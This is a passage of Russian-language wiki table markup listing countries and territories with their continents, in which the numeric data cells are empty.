|style="text-align:right"| ||Кения|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Коста-Рика|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сербия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Непал|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ирландия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Австралия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Австралия и Океания||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Австрия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сальвадор|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Чехия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Камерун|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Государство Палестина|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Кот-д’Ивуар|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Босния и Герцеговина|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Южная Корея|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Дания|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Болгария|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мадагаскар|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Северная Македония|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Судан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сенегал|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Парагвай|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ливан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Замбия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Норвегия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Демократическая Республика Конго|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ливия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Малайзия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гвинея|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гвиана (департамент Франции)|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Габон|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Таджикистан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гаити|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Албания|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Финляндия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Греция|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Люксембург|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Хорватия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мавритания|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мальдивы|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Зимбабве|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Джибути|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Малави|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Венгрия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Экваториальная Гвинея|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Центральноафриканская Республика|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Намибия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гонконг|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Никарагуа|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Черногория|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Эсватини|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Республика Конго|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Куба|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Северная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Таиланд|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Кабо-Верде|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Суринам|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Южная Америка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сомали|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Майотта|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мозамбик|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Словакия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Шри-Ланка|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Азия||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Мали|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Руанда|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Литва|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Южный Судан|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Словения|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Тунис|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гамбия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Эстония|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Гвинея-Бисау|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Бенин|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Исландия|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Европа||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Ангола|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
|style="text-align:right"| ||Сьерра-Леоне|| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| ||Африка||style="text-align:right"| ||style="text-align:right"| ||style="text-align:right"| 
|-
